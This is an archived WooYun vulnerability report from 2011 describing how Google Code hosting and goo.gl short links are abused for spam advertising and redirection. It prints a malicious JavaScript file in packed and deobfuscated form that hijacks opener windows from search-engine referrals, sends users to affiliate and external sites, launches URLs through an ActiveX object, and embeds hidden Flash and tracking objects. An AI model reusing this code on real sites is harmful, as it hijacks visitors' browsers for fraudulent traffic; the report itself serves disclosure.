<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		Google业务被恶意钓鱼和广告利用  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		Google业务被恶意钓鱼和广告利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xsser">xsser</a> 
</li><li>提交时间：		2011-02-15 15:13</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2011-02-15：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
									2011-02-15：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">Google的一些互联网业务，包括Google Code和Google短网址服务被恶意钓鱼和垃圾广告利用</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>http://bijioc.googlecode.com/svn/trunk/js/navigatenormal.js?v=TueFeb152011.js</code></pre><p class='detail'><br />
<br />
</p><pre><code>var urlarr = [&quot;http://goo.gl/NZZl&quot;, &quot;http://goo.gl/2bEs&quot;];</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#039;&#039;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c])}}return p}(&#039;6 1j=Z 2e(&quot;(9.F.3)|(9.1b.q)|(9.1b.1g)|(9.2f.3)|(X.q.12.3)|(X.12.3)|(2i.1p.q)|(1k.1p.q)|(X.2b.26.q)|(1k.3)|(9.25.3)|(9.24.3)|(9.27.3)|(28.3)|(9.2a.3)|(29.F.3)|(m.F.3)|(F.2j)|(2k.3)|(2u.3)|(2t.3)|(2v.3)|(2w.3)&quot;,&quot;i&quot;);4(&quot;A&quot;==G(I))I=&quot;2y&quot;;4(&quot;A&quot;==G(1c))1c=2x;6 2=[];6 n=v;a{4(H&amp;&amp;H.f&amp;&amp;H.5.2s(&quot;2r&quot;)){n=H}}g(e){}2.Y=[[&quot;8://9.2l.3/?2n=2o&quot;,23],[&quot;8://p.2q.3/c?s=2p&amp;w=2z&amp;c=1W&amp;i=1M&amp;l=0&amp;e=&amp;t=8://9.1L.3/1O.1P&quot;,1K]];2.1i=h(){a{6 R=[&quot;8://S.T/1F&quot;,&quot;8://S.T/1G&quot;];4(5.k){2.Q.1J(R[1H(1I.1Q()*R.J)]);2.Q=13;1Y.1Z()}}g(e){}};2.1d=h(){a{4(5.k&amp;&amp;&quot;A&quot;==G(21)){2.Q=5.18(&quot;&lt;E y=0 o=0 1r=\&#039;1S:1T-1V-22-1X-1N\&#039;&gt;&lt;/E&gt;&quot;);v.k(&quot;20&quot;,2.1i)}}g(e){}};2.1o=V;2.W=V;2.U=h(j){a{n.r.r.1e(j)}g(e){a{n.r.1e(j)}g(2J){a{n.r.1f=j}g(2A){2.1d();2.W=1n}}}};2.O=h(j){4(2.Y.J&gt;0){6 P=2.Y.3f();2.U(P[0]);4(!2.W){1a(&quot;2.O(\&#039;&quot;+j+&quot;\&#039;)&quot;,P[1])}}u{2.U(j)}};2.M=h(){6 N=&quot;8://3h.1g.3i/3d.3c?s=&quot;+I;4(5.k){N+=&quot;&amp;c=&quot;+v.1f.37}2.O(N)};4(n.r){4(1j.3b(n.5.3a)){2.1o=1n;4(&quot;A&quot;==G(1m)){2.M()}u 4(&quot;3n&quot;==1m){}u{2.M()}}}2.1E=h(1q){6 L=5.10.1l(&quot;; &quot;);3o(6 i=0;i&lt;L.J;i++){6 K=L[i].1l(&quot;=&quot;);4(1q==K[0])19 2L(K[1])}19&quot;&quot;};2.1u=h(11){D=Z 2I();D.2H(D.2C()+15);5.10=&quot;1C=&quot;+2D(11)+&quot;; 2G=&quot;+D.2P()+&quot;;2Q=/&quot;};2.C=h(){4(5.1s==13){1a(2.C,31)}u{6 d=5.18(&quot;33&quot;);d.B.y=&quot;0&quot;;d.B.o=&quot;0&quot;;d.B.2Y=&quot;2X&quot;;d.B.2S=&quot;-2R&quot;;6 z=&quot;8://17.14.3/16/1h/1A/1B.1D&quot;;a{4(!5.k&amp;&amp;(2T.2U.2W(&quot;2V&quot;)&gt;-1)){z=&quot;8://17.14.3/16/1h/1A/1B.1D?b=32&quot;}}g(e){}d.1v=\&#039;&lt;E 1r=&quot;2Z:30-2F-2E-2B-2N&quot; 2O=&quot;8://2M.1x.3/35/1w/2K/1t/34.3m#3r=7,0,0,0&quot; y=&quot;0&quot; o=&quot;0&quot;&gt;&lt;3p 3q=&quot;3k&quot; 3l=&quot;\&#039;+z+\&#039;&quot; /&gt;&lt;39 1y=&quot;\&#039;+z+\&#039;&quot; y=&quot;0&quot; o=&quot;0&quot; 38=&quot;36/x-1w-1t&quot; 3j=&quot;8://9.1x.3/3g/3e&quot; /&gt;&lt;/E&gt;\&#039;;6 1z=2.1E(&quot;1C&quot;);4(&quot;1&quot;!=1z){d.1v+=&quot;&lt;1U 1y=\&#039;8://S.T/1R\&#039; y=\&#039;0\&#039; o=\&#039;0\&#039; 2m=\&#039;0\&#039;/&gt;&quot;;2.1u(&quot;1&quot;)}5.1s.2c(d)}};a{4(5.k){v.k(&quot;2h&quot;,2.C)}u{v.2g(&quot;2d&quot;,2.C,V)}}g(e){}&#039;,62,214,&#039;||_bijioc|com|if|document|var||http|www|try|||node|||catch|function||lochref|attachEvent|||_win|height||cn|opener|||else|window|||width|fp|undefined|style|appendpiece|date|object|baidu|typeof|parent|_jdcustomize|length|aCrumb|aCookie|justnavigate|urlr|navigateToUrl|nf|pnode|urlarr|goo|gl|navigateIt|false|hb|search|nHref|new|cookie|sValue|yahoo|null|googlecode||svn|bijioc|createElement|return|setTimeout|google|_jdcid|navigatePower|navigate|location|co|trunk|powerboom|_searchSites|bing|split|_lochref|true|ho|118114|sName|classid|body|flash|setcookie|innerHTML|shockwave|macromedia|src|_co|flv|broadpage|oc_biji|swf|getcookie|NZZl|2bEs|parseInt|Math|launchURL|600|vipshop|2882|00C04F79FAA6|index|php|random|CLEC|CLSID|6BF52A52|img|394A|4018|B153|self|focus|onunload|_nonapower|11D3|800|sogou|soso|vnet|taobao|gougou|cache|gouwo|114|appendChild|load|RegExp|youdao|addEventListener|onload|114search|asp|hao123|vancl|border|source|josion|788e4edd|yiqifa|fulliframe|getElementById|114la|265|115|etao|10011813|normal|148042|e3|96b8|getMinutes|escape|11cf|ae6d|expires|setMinutes|Date|e2|cabs|unescape|fpdownload|444553540000|codebase|toGMTString|path|100px|left|navigator|userAgent|Firefox|indexOf|absolute|position|clsid|d27cdb6e|200|ff|DIV|swflash|pub|application|host|type|embed|referrer|test|html|gomall|getflashplayer|shift|go|ocbiji|cc|pluginspage|movie|value|cab|donotnavigate|for|param|name|version&#039;.split(&#039;|&#039;),0,{}))</code></pre><p class='detail'><br />
<br />
转换后<br />
<br />
</p><pre><code>var _searchSites = new RegExp(&quot;(www.baidu.com)|(www.google.cn)|(www.google.co)|(www.youdao.com)|(search.cn.yahoo.com)|(search.yahoo.com)|(114search.118114.cn)|(bing.118114.cn)|(search.114.vnet.cn)|(bing.com)|(www.soso.com)|(www.sogou.com)|(www.taobao.com)|(gougou.com)|(www.gouwo.com)|(cache.baidu.com)|(m.baidu.com)|(baidu.asp)|(hao123.com)|(265.com)|(114la.com)|(115.com)|(etao.com)&quot;, &quot;i&quot;);<br />
if (&quot;undefined&quot; == typeof(_jdcustomize)) _jdcustomize = &quot;normal&quot;;<br />
if (&quot;undefined&quot; == typeof(_jdcid)) _jdcid = 10011813;<br />
var _bijioc = [];<br />
var _win = window;<br />
try {<br />
    if (parent &amp;&amp; parent.f &amp;&amp; parent.document.getElementById(&quot;fulliframe&quot;)) {<br />
        _win = parent<br />
    }<br />
} catch (e) {}<br />
_bijioc.nHref = [<br />
    [&quot;http://www.vancl.com/?source=josion&quot;, 800],<br />
    [&quot;http://p.yiqifa.com/c?s=788e4edd&amp;w=148042&amp;c=4018&amp;i=2882&amp;l=0&amp;e=&amp;t=http://www.vipshop.com/index.php&quot;, 600]<br />
];<br />
_bijioc.powerboom = function () {<br />
    try {<br />
        var urlarr = [&quot;http://goo.gl/NZZl&quot;, &quot;http://goo.gl/2bEs&quot;];<br />
        if (document.attachEvent) {<br />
            _bijioc.pnode.launchURL(urlarr[parseInt(Math.random() * urlarr.length)]);<br />
            _bijioc.pnode = null;<br />
            self.focus()<br />
        }<br />
    } catch (e) {}<br />
};<br />
_bijioc.navigatePower = function () {<br />
    try {<br />
        if (document.attachEvent &amp;&amp; &quot;undefined&quot; == typeof(_nonapower)) {<br />
            _bijioc.pnode = document.createElement(&quot;&lt;object width=0 height=0 classid=&#039;CLSID:6BF52A52-394A-11D3-B153-00C04F79FAA6&#039;&gt;&lt;/object&gt;&quot;);<br />
            window.attachEvent(&quot;onunload&quot;, _bijioc.powerboom)<br />
        }<br />
    } catch (e) {}<br />
};<br />
_bijioc.ho = false;<br />
_bijioc.hb = false;<br />
_bijioc.navigateIt = function (lochref) {<br />
    try {<br />
        _win.opener.opener.navigate(lochref)<br />
    } catch (e) {<br />
        try {<br />
            _win.opener.navigate(lochref)<br />
        } catch (e2) {<br />
            try {<br />
                _win.opener.location = lochref<br />
            } catch (e3) {<br />
                _bijioc.navigatePower();<br />
                _bijioc.hb = true<br />
            }<br />
        }<br />
    }<br />
};<br />
_bijioc.navigateToUrl = function (lochref) {<br />
    if (_bijioc.nHref.length &gt; 0) {<br />
        var nf = _bijioc.nHref.shift();<br />
        _bijioc.navigateIt(nf[0]);<br />
        if (!_bijioc.hb) {<br />
            setTimeout(&quot;_bijioc.navigateToUrl(&#039;&quot; + lochref + &quot;&#039;)&quot;, nf[1])<br />
        }<br />
    } else {<br />
        _bijioc.navigateIt(lochref)<br />
    }<br />
};<br />
_bijioc.justnavigate = function () {<br />
    var urlr = &quot;http://ocbiji.co.cc/gomall.html?s=&quot; + _jdcustomize;<br />
    if (document.attachEvent) {<br />
        urlr += &quot;&amp;c=&quot; + window.location.host<br />
    }<br />
    _bijioc.navigateToUrl(urlr)<br />
};<br />
if (_win.opener) {<br />
    if (_searchSites.test(_win.document.referrer)) {<br />
        _bijioc.ho = true;<br />
        if (&quot;undefined&quot; == typeof(_lochref)) {<br />
            _bijioc.justnavigate()<br />
        } else if (&quot;donotnavigate&quot; == _lochref) {} else {<br />
            _bijioc.justnavigate()<br />
        }<br />
    }<br />
}<br />
_bijioc.getcookie = function (sName) {<br />
    var aCookie = document.cookie.split(&quot;; &quot;);<br />
    for (var i = 0; i &lt; aCookie.length; i++) {<br />
        var aCrumb = aCookie[i].split(&quot;=&quot;);<br />
        if (sName == aCrumb[0]) return unescape(aCrumb[1])<br />
    }<br />
    return &quot;&quot;<br />
};<br />
_bijioc.setcookie = function (sValue) {<br />
    date = new Date();<br />
    date.setMinutes(date.getMinutes() + 15);<br />
    document.cookie = &quot;oc_biji=&quot; + escape(sValue) + &quot;; expires=&quot; + date.toGMTString() + &quot;;path=/&quot;<br />
};<br />
_bijioc.appendpiece = function () {<br />
    if (document.body == null) {<br />
        setTimeout(_bijioc.appendpiece, 200)<br />
    } else {<br />
        var node = document.createElement(&quot;DIV&quot;);<br />
        node.style.width = &quot;0&quot;;<br />
        node.style.height = &quot;0&quot;;<br />
        node.style.position = &quot;absolute&quot;;<br />
        node.style.left = &quot;-100px&quot;;<br />
        var fp = &quot;http://bijioc.googlecode.com/svn/trunk/flv/broadpage.swf&quot;;<br />
        try {<br />
            if (!document.attachEvent &amp;&amp; (navigator.userAgent.indexOf(&quot;Firefox&quot;) &gt; -1)) {<br />
                fp = &quot;http://bijioc.googlecode.com/svn/trunk/flv/broadpage.swf?b=ff&quot;<br />
            }<br />
        } catch (e) {}<br />
        node.innerHTML = &#039;&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;&#039; + fp + &#039;&quot; /&gt;&lt;embed src=&quot;&#039; + fp + &#039;&quot; width=&quot;0&quot; height=&quot;0&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&lt;/object&gt;&#039;;<br />
        var _co = _bijioc.getcookie(&quot;oc_biji&quot;);<br />
        if (&quot;1&quot; != _co) {<br />
            node.innerHTML += &quot;&lt;img src=&#039;http://goo.gl/CLEC&#039; width=&#039;0&#039; height=&#039;0&#039; border=&#039;0&#039;/&gt;&quot;;<br />
            _bijioc.setcookie(&quot;1&quot;)<br />
        }<br />
        document.body.appendChild(node)<br />
    }<br />
};<br />
try {<br />
    if (document.attachEvent) {<br />
        window.attachEvent(&quot;onload&quot;, _bijioc.appendpiece)<br />
    } else {<br />
        window.addEventListener(&quot;load&quot;, _bijioc.appendpiece, false)<br />
    }<br />
} catch (e) {}</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">增加业务的检查，避免被恶意利用 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xsser" title="xsser">xsser</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01319" title="Google业务被恶意钓鱼和广告利用">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
									<h3 class="detailTitle">厂商回应：</h3>
										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
																<p class="detail">漏洞Rank：3 (WooYun评价)</p>
												
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="1319";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
